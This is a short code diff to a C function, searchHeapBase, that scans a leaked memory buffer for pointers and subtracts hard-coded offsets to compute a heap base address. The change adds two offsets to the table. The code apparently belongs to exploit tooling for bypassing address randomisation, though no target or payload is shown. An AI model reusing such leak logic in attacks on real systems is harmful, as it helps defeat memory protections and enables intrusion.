@@ -394,7 +394,7 @@ uint64_t searchHeapBase(void *ptr, size_t size, uint64_t textBase)
 	int j;
 	uint64_t value, ans = 0;
 	bool flag = 0;
-	uint64_t target_offset[4] = {0x66ea0, 0xab778, 0xeb4930, 0xe25358};
+	uint64_t target_offset[6] = {0x66ea0, 0xab778, 0xeb4930, 0xe25358, 0x40eb0, 0xea1688};
 	for (i = 0; i < size-8; i += 8)
 	{
 		value = 0;
@@ -407,7 +407,7 @@ uint64_t searchHeapBase(void *ptr, size_t size, uint64_t textBase)
 		{	
 			if( (value - textBase) > 0x691000)
 			{				
-			    for(j = 0; j < 4; j++)
+			    for(j = 0; j < 6; j++)
 			    {
 				    if(((value -target_offset[j])&0xfff) == 0 && !flag){
 					    ans = value -target_offset[j];
@@ -427,7 +427,7 @@ uint64_t searchHeapBase(void *ptr, size_t size, uint64_t textBase)
 		{	
 			if( (value - textBase) > 0x691000)
 			{				
-			    for(j = 0; j < 4; j++)
+			    for(j = 0; j < 6; j++)
 			    {
 				    if(((value -target_offset[j])&0xfff) == 0 && !flag){
 					    ans = value -target_offset[j];
